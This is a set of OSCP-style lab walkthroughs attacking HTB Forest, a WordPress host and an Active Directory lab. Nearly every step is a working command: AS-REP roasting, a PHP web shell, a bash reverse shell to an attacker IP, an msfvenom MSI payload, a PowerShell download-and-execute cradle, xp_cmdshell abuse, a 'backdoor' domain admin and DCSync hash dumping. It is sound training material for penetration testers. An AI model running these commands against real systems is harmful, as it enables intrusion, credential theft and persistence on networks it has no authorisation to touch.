# Lab Walkthrough Examples

## Table of Contents
- [HTB Forest - OSCP-Style](#htb-forest---oscp-style)
- [OSCP Independent Challenge Example](#oscp-independent-challenge-example)
- [Active Directory Set Attack Chain](#active-directory-set-attack-chain)

---

## HTB Forest - OSCP-Style

### Target Info
- **Domain**: htb.local
- **Target IP**: 10.129.231.126
- **Difficulty**: Easy
- **Attack Path**: LDAP enum → AS-REP Roast → WinRM → BloodHound ACE abuse → DCSync

### Phase 1: Reconnaissance & Enumeration

> Initial Nmap scan for open ports
```shell
nmap -Pn -n -p- -sS -sV -sC 10.129.231.126
```

**Results:**
- 53/tcp: DNS
- 88/tcp: Kerberos
- 135/tcp: MSRPC
- 139/tcp: NetBios
- 389/tcp: LDAP
- 445/tcp: SMB
- 3268/tcp: LDAP GC
- 3269/tcp: LDAP GC SSL

### Phase 2: LDAP Enumeration (Null Session)

> Check for anonymous LDAP bind
```shell
ldapsearch -h 10.129.231.126 -x -b "DC=htb,DC=local"
```

> Get base naming context
```shell
ldapsearch -h 10.129.231.126 -x -s base
```

> Enumerate all domain users
```shell
ldapsearch -h 10.129.231.126 -x -b "CN=Users,DC=htb,DC=local" \
  "objectClass=person" sAMAccountName
```

**Found Users:**
- svc-alfresco (service account)
- Administrator
- Guest

### Phase 3: AS-REP Roasting

> Get AS-REP hash for svc-alfresco (pre-auth disabled)
```shell
impacket-GetNPUsers -dc-ip 10.129.231.126 htb.local/ -usersfile users.txt -format hashcat
```

> Extract hash from output
```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:8be3...encrypted_hash...
```

> Crack with hashcat
```shell
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force
```

**Password Found**: s3rvic3
**Username**: svc-alfresco

### Phase 4: WinRM Access

> Verify WinRM port (5985)
```shell
nmap -p 5985 -sV 10.129.231.126
```

> Login with Evil-WinRM
```shell
evil-winrm -i 10.129.231.126 -u svc-alfresco -p s3rvic3
```

> Get user proof
```powershell
cat C:\Users\svc-alfresco\Desktop\user.txt
3e7b...flag_hash...
```

### Phase 5: Privilege Escalation via ACL Abuse

> Export BloodHound data
```powershell
. ./SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp
```

> Transfer SharpHound output to attacker
```shell
# In WinRM session
python3 -m http.server 8000 -d C:\temp
# On attacker
wget http://10.129.231.126:8000/XXX.zip
```

> Analyze in BloodHound
**Finding:** svc-alfresco has **WriteDacl** permission on HTB.local domain

### Phase 6: Create Rogue Admin & DCSync

> Create new user (if WriteDacl gained)
```powershell
net user backdoor P@ssw0rd123 /add /domain
```

> Add user to Domain Admins group via ACL abuse
```powershell
# Using PowerView after gaining permissions
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity backdoor -Right All
net group "Domain Admins" backdoor /add /domain
```

> Perform DCSync to get all hashes
```shell
impacket-secretsdump -dc-ip 10.129.231.126 htb.local/backdoor:P@ssw0rd123@10.129.231.126
```

**Retrieved**: Administrator NTLM hash

> PSExec as Administrator
```shell
impacket-psexec -hashes LM_HASH:ADMIN_HASH htb.local/Administrator@10.129.231.126
```

> Get root proof
```powershell
cat C:\Users\Administrator\Desktop\root.txt
8b73...flag_hash...
```

---

## OSCP Independent Challenge Example

### Target: 192.168.232.55

### Phase 1: Service Enumeration

> Nmap scan
```shell
nmap -Pn -p- -sV -sC 192.168.232.55
```

**Open Ports:**
- 22/tcp: SSH
- 80/tcp: HTTP (WordPress)
- 139/tcp: SMB
- 445/tcp: SMB

### Phase 2: Initial Access via SMB Share

> Enumerate SMB shares
```shell
smbclient -L \\\\192.168.232.55 -N
```

**Found**: Anonymous share with backup files

> Download files from anonymous share
```shell
smbclient \\\\192.168.232.55\\backups -N
smb: \> get backup.zip
smb: \> exit
```

> Extract and analyze
```shell
unzip backup.zip
ls -la
# Found: wp-config.php with database credentials
# Username: wp_user
# Password: R00t@P@ss
```

### Phase 3: WordPress Exploitation

> Access WordPress admin panel
```
http://192.168.232.55/wp-admin
Login with wp_user:R00t@P@ss
```

> Upload malicious plugin for RCE
```php
<?php
// wp-content/plugins/shell/shell.php
system($_GET['cmd']);
?>
```

> Or use WordPress plugin upload to get shell
```shell
curl "http://192.168.232.55/wp-content/plugins/shell/shell.php?cmd=whoami"
```

> Get reverse shell
```shell
curl "http://192.168.232.55/wp-content/plugins/shell/shell.php?cmd=bash%20-i%20>%26%20/dev/tcp/192.168.49.232/4444%200>%261"
```

**In listener:**
```shell
nc -lvnp 4444
```

### Phase 4: Privilege Escalation (Windows)

> Enumerate privilege escalation vectors
```powershell
whoami /priv
```

**Found**: SeImpersonate token enabled (indicates AlwaysInstallElevated possibility)

> Check registry for AlwaysInstallElevated
```powershell
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Result**: Value = 1 (Enabled)

> Create malicious MSI installer
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.49.232 LPORT=5555 \
  -f msi > exploit.msi
```

> Execute MSI (will run as SYSTEM)
```powershell
msiexec /i C:\temp\exploit.msi /quiet /qn
```

> Get elevated shell
```shell
# Metasploit listener
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.49.232
set LPORT 5555
run
```

**SYSTEM shell obtained**

> Get proof
```shell
type C:\Users\Administrator\Desktop\proof.txt
```

---

## Active Directory Set Attack Chain

### Scenario: Multi-Machine Compromise (WS26 → SRV22 → DC20)

### Phase 1: Initial Access (WS26 - Workstation)

**Credentials Provided:** r.andrews / BusyOfficeWorker890

> RDP into workstation
```shell
xfreerdp3 /u:r.andrews /p:BusyOfficeWorker890 /v:192.168.87.206
```

> Check user privileges
```powershell
whoami /priv
```

### Phase 2: Privilege Escalation (WS26)

> Find writable task file
```powershell
dir C:\Windows\Logs\
cacls C:\Windows\Logs\task.bat
# Output: Everyone:(F) - Everyone has full control
```

> Create reverse shell payload (Base64 encoded)
```powershell
$payload = 'powershell.exe -c IEX(New-Object Net.WebClient).DownloadString("http://192.168.49.87/shell.ps1")'
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
```

> Replace task.bat content
```powershell
echo powershell -e BASE64_PAYLOAD > C:\Windows\Logs\task.bat
```

> Wait for scheduled task execution (trigger or wait for automation)
```shell
# On attacker: setup listener
nc -lvnp 5966
# Reverse shell will connect
```

> Verify privilege level
```powershell
whoami /priv
# Should now be SYSTEM or higher
```

### Phase 3: Credential Discovery (WS26)

> Search for credentials in common locations
```powershell
type C:\Users\Administrator\Documents\Notes
# Output: svc_sql : SQLPowerHouse333
```

### Phase 4: Tunneling Setup for Internal Access

> Download Ligolo-ng agent
```powershell
iwr -Uri http://192.168.49.87:7000/agent.exe -Outfile agent.exe
.\agent.exe -connect 192.168.49.87:443 -ignore-cert
```

> On attacker: setup tunnel
```shell
./proxy -selfcert -laddr 0.0.0.0:443
session >> start
session >> ifconfig  # Get internal IP range
```

> Add route to internal network
```shell
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.87.0/24 dev ligolo
```

### Phase 5: SQL Server Exploitation (SRV22)

> Verify credentials work
```shell
netexec smb 172.16.87.202 -u svc_sql -p SQLPowerHouse333
```

> Connect to MSSQL
```shell
impacket-mssqlclient -debug svc_sql:SQLPowerHouse333@172.16.87.202
SQL> xp_cmdshell "whoami"
```

> Get reverse shell via MSSQL RCE
```shell
impacket-mssqlclient svc_sql:SQLPowerHouse333@172.16.87.202 -windows-auth
SQL> EXEC sp_configure 'show advanced options', 1
SQL> RECONFIGURE
SQL> EXEC sp_configure 'xp_cmdshell', 1
SQL> RECONFIGURE
SQL> xp_cmdshell "powershell -e BASE64_REVERSE_SHELL"
```

### Phase 6: Domain Controller Access (DC20)

> Check if svc_sql can access DC
```shell
impacket-psexec -hashes :NTLM_HASH svc_sql@172.16.87.200 cmd
```

> If direct access denied, check Kerberos delegation
```powershell
Get-ADUser svc_sql -Properties *| select msds-allowedtodelegateto
```

> If unconstrained delegation, perform printer bug to capture TGT
```shell
impacket-printerbug svc_sql:SQLPowerHouse333@172.16.87.200 172.16.87.202
# Captured TGT will be saved
```

> Use TGT for PSExec to DC
```shell
export KRB5CCNAME=captured.ccache
impacket-psexec -k -no-pass Administrator@172.16.87.200
```

> Dump domain hashes
```shell
impacket-secretsdump -k -no-pass Administrator@172.16.87.200
```

> Get proof flags
```powershell
type C:\Users\Administrator\Desktop\proof.txt
```

---

## Key Takeaways

1. **Enum First**: LDAP null session, SMB enumeration always first
2. **Credential Reuse**: Look for creds in files, history, config
3. **Service Accounts**: Target them with Kerberoasting/ASREPRoast
4. **Privilege Escalation**: Check file permissions, scheduled tasks, tokens
5. **Lateral Movement**: Use obtained creds with PSExec, WinRM, RDP
6. **Pivoting**: Setup tunnel (Ligolo-ng) for internal network access
7. **AD Abuse**: Use BloodHound to find attack paths (WriteDacl, etc.)
8. **Documentation**: Screenshot every step for exam report

---

## See Also

### OSCP Exam Files
- **[OSCP Exam Guide](9.1.OSCP-Exam-Guide.md)** - Exam structure, scoring, allowed tools, AD methodology
- **[Exam Tips & Tricks](9.3.Exam-Tips-and-Tricks.md)** - Time management, enumeration priority, report writing

### AD Attack Techniques (Used in Walkthroughs)
- **[AD Exploitation](../3.AD-Exploit/3.1.AD-Exploitation.md)** - BloodHound, ACL abuse, enumeration
- **[Kerberos Attacks](../3.AD-Exploit/3.3.Kerberos-Attacks.md)** - ASREPRoast, DCSync, Golden Tickets
- **[NTLM Relay](../3.AD-Exploit/3.4.NTLM-Relay-and-Responder.md)** - Responder, relay attacks

### Privilege Escalation & Movement
- **[Windows Privilege Escalation](../4.Privilege-Escalation/4.1.Privilege-Escalation-Windows.md)** - Potato exploits, DLL hijacking
- **[Linux Privilege Escalation](../4.Privilege-Escalation/4.2.Privilege-Escalation-Linux.md)** - SUDO, SUID exploitation
- **[Ligolo-ng Complete Guide](../5.Lateral-Movement/5.3.Ligolo-ng-Complete-Guide.md)** - Pivoting setup used in AD Set
